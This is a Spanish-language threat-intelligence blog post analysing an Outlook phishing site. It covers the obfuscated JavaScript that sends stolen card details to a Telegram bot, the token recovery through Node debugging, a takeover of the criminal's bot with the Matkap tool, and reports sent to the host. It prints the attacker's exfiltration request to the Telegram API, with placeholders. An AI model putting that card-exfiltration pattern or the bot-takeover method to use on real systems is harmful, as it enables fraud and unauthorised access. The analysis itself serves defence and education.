# CTI ID: 01-A-001 xmailline-verfo0l.zya.me
---
**Bienvenidos** a esta nueva serie de blogs sobre *Cyber Threat Intelligence* (**CTI**), donde exploraremos cómo identifico, analizo y documento amenazas digitales en tiempo real. El objetivo de esta serie es brindar una mirada práctica y educativa sobre el mundo de la ciberseguridad ofensiva y defensiva, ayudando a los lectores a comprender las técnicas y herramientas utilizadas para protegerse en el ciberespacio.

En este primer capítulo, nos centraremos en el análisis de una web de [phishing](https://es.wikipedia.org/wiki/Phishing), una de las amenazas más comunes y efectivas que enfrentan los usuarios hoy en día. A través de este caso práctico, aprenderemos algunas de las tácticas empleadas por los ciberdelincuentes en la vida diaria y además al final te daré unos tips prácticos para evitar caer en estas trampas mortales. 

Prepárate para sumergirte en el mundo del análisis de amenazas y descubrir cómo el conocimiento de CTI me ayudó a desmantelar esta amenaza digital.

---
# CTI Técnico

## Advertencia ⚠️: Este bloque es para nerds de la ciberseguridad que desean conocer el paso a paso.

Bien, todo comenzó cuando por *Discord* un amigo envió dos capuras de pantalla de un correo electronico sospechoso.


![1](https://github.com/user-attachments/assets/c98fab2b-60d2-4d56-be2d-8c6aa64b1225)


De inmediato resaltó en el correo una [URL](https://es.wikipedia.org/wiki/Localizador_de_recursos_uniforme), `https://xmailline-verfo0l.zya.me/`, que no correspondia con la real de [*Outlook*](outlook.live.com), algo que de por si te genera muchas alertas al verlo.

Decidí investigar visitando el sitio desde una Máquina Virtal y obtuve esto:


<img width="1919" height="969" alt="Screenshot 2025-08-21 210313" src="https://github.com/user-attachments/assets/c9ece646-724c-48c3-8210-691db1594832" />


Entrando a la URL podemos ver una **imitación** mas o menos decente de outlook.live.com pero con unos fallos en la Interfaz de Usuario. Al poner nuestro correo (En este caso usé uno falso para las pruebas sin levantar sospechas) no redirije a `_index.html` donde se nos pide nuestra contraseña de Outlook y luego nos redirije a `_indexx.html`.


<img width="1919" height="970" alt="Screenshot 2025-08-21 210051" src="https://github.com/user-attachments/assets/b2071438-dbe7-4e80-a46f-04d90d477f0b" />


Aqui se nos pide nuestros datos bancarios, supuestamente para adquirir una cuenta de correo electrónico por $0.89 USD al año cuando es **totalmente gratis** . Al revisar el codigo fuente de `_indexx.html` pude ver algo curioso.


<img width="1893" height="579" alt="Screenshot 2025-08-21 210214" src="https://github.com/user-attachments/assets/76b0cb7c-fcee-4aef-a9c1-9f91176007d7" />

Asi es, el HTML estaba corriendo 2 archivos Javascript con código de dudosa procedencia, los cuales estaban obfuscados, pero a pesar de eso era legible algo en el js incrustado algo relacionado a un bot de telegram. Esto se confirmo al encontrar y desobfuscar `tlgram.js`.


<img width="1898" height="533" alt="Screenshot 2025-08-21 210242" src="https://github.com/user-attachments/assets/821e4479-7b56-4190-b876-111bb58bf97d" />


**Y luego lo desobfusqué en https://deobfuscate.io/**


<img width="1338" height="835" alt="Screenshot 2025-08-22 010711" src="https://github.com/user-attachments/assets/6bb13361-dff3-4e9e-acbd-7af924405f5a" />


Ahora tenemos código mas legible, con el cual ya sabemos que el HTML hace una petición cuando se termina de recopilar los datos para enviarlos por un bot de telegram. Y la petición se veria asi:

```bash
POST https://api.telegram.org/bot<T0KEN>/sendMessage
Content-Type: application/json
cache-control: no-cache
{
  "chat_id": "<CHATID>",
  "text": "🍄🍄0UTL🍄🍄\n\nNUM-TARJ: [NÚMERO_TARJETA]\nN0MBR3: [NOMBRE_TITULAR]\nEXPIRACI0N: [MM]/[AA]\nCVV: [CVV]\n🌎IP: [IP_VÍCTIMA]\n[CIUDAD], [PAÍS]"
}
```
Ahora nos falta descubrir el valor de `<CHATID>` y de `<T0KEN>`. Para comenzar, descargamos `tlgram.js` y probamos dentro del mismo código obfuscado inyectarle código para que guarde los valores de las variables y las imprima.


<img width="1427" height="687" alt="Screenshot 2025-08-21 214015" src="https://github.com/user-attachments/assets/8db98171-1c56-4275-a2d6-1f297d643707" />


Tras intentarlo no obtenemos éxito inmediato, pues el ciberdelincuente habia pensado en que posiblemente alguien podia buscar esos valores y pues dividió ambos en varias cadenas cifradas que de descifran poco a poco. Tras obtener este conocimiento, se me ocurre una idea. Si purgamos en codigo linea por linea quizas podriamos obtener en un momento certero los valores de `<CHATID>` y `<T0KEN>` en las variables globales de las DevTools de Chrome en una pestaña apartada de Nodejs. Me puse manos a la obra y mi trabajo dió sus frutos. 

Primero en una terminal puse a Nodejs a correr el codigo cifrado hasta la primera linea con  `node --inspect-brk tlgram.js`


<img width="947" height="87" alt="Screenshot 2025-08-21 214119" src="https://github.com/user-attachments/assets/10ae39ff-324f-466d-8e4c-e3492ee8607f" />


Luego puse un breakpoint donde se definían las variables para pasarlas a las globales de DevTools depurandolas con la función *Step into* y *Step over*. Al correlo, eventualmentee, obtuve ambos valores en el *Scope* de las *DevTools* definidas como 2 variables globales. 


<img width="1919" height="924" alt="Diseño sin título (1)" src="https://github.com/user-attachments/assets/bacb345d-78c5-46a2-b984-c5667e7ca273" />


Gracias a estos valores puedo "apoderarme" de el bot de telegram gracias a una herramienta hecha en python llamada [**Matkap**](https://github.com/0x6rss/matkap) creada por *0x6rss*, para manipular bots maliciosos de telegram y poder extraer todas las conversaciones maliciosas de los atacantes y deshabilitarles el bot.


<img width="1919" height="863" alt="Screenshot 2025-08-22 001918" src="https://github.com/user-attachments/assets/7cbbd64a-78da-458e-aacb-b06c47528f9b" />


Me puse de nuevo manos a la obra e inicié Matkap. 


<img width="1625" height="911" alt="Screenshot 2025-08-21 205934" src="https://github.com/user-attachments/assets/aa367a30-48ef-449e-a157-bf2c47213213" />


Al ejecutarlo con ambos valores, logré efectivamente apoderarme del bot y vi que tenian alrededor de mas de 100 mensajes de otras victimas que habían caído  en esta estafa. Pero despues por alguna rázon dejaron de verse esos mensajes y pues solo vi mis 2 mensajes que envie haciendome pasar por una víctima. Aún asi la operación fué un éxito ya que obtuve el telegram del bot.


<img width="1441" height="865" alt="Screenshot 2025-08-21 235651" src="https://github.com/user-attachments/assets/2e041792-3e7c-4a3a-b116-e8224e6093c6" />


Luego este mismo, recibió un comando de parte del atacante y de ahi obtuve su ID de telegram. Le escribí con otra cuenta haciendome pasar por un interesado en comprarle una *"combolist"* de tarjetas de crétido, este al pasar la conversación me confirmó su país al decirme que era de República Dominicana. Al ver que yo trataba de sacarle mas info, se enojó y me bloqueó.

Al ver que no se iva a poder hacer mucho, reporte el usuario y bot de Telegram, busque el hosting de la web, **I Fastnet Ltd**, y envie una solicitud de eliminación de esta ya que se estaba usando con fines maliciosos. Reporté además la ip de la web en Ip Abuse al igual que la URL en Virus Total.

---

# Resumen y tips.

Resumen y Consejos Prácticos

> ⚠️ El phishing es una de las estafas más comunes en Internet.
>  En este caso, los atacantes crearon una copia falsa de Outlook para robar correos, contraseñas y hasta datos bancarios.

Aunque el análisis técnico muestra los detalles, aquí tienes lo más importante que necesitas recordar 👇

🛡️ Tips para Protegerte del Phishing
| 🚩 Señal de alerta                                   | ✅ Qué hacer                                                                                                                       |
| ---------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| 🔗 URL rara o sospechosa (`zya.me`, `verfo0l`, etc.) | Siempre revisa la dirección antes de hacer clic                                                                                   |
| 💰 Ofertas demasiado buenas                          | Si algo suena irreal, probablemente lo es                                                                                         |
| 🖼️ Páginas mal hechas o con errores                 | Desconfía de sitios con diseño pobre o traducciones raras                                                                         |
| 💳 Te piden tarjeta para servicios gratuitos         | Nunca entregues datos bancarios en páginas dudosas                                                                                |
| 🔐 Solo piden usuario y contraseña                   | Activa siempre la **verificación en 2 pasos**                                                                                     |
| 📢 No sabes a quién reportar                         | Usa [Google Safe Browsing](https://safebrowsing.google.com/safebrowsing/report_phish/) o [VirusTotal](https://www.virustotal.com) |

 
# Consejos finales

1. **Duda siempre**: si algo no se ve confiable, no lo abras.
2. **Verifica con la empresa real**: entra manualmente al sitio oficial.
3. **No te apresures**: los atacantes juegan con la urgencia para que no pienses.

## Recuerda: 
La primera línea de defensa eres tú.
Un clic menos puede ahorrarte un gran dolor de cabeza.

Pasa buen dia.
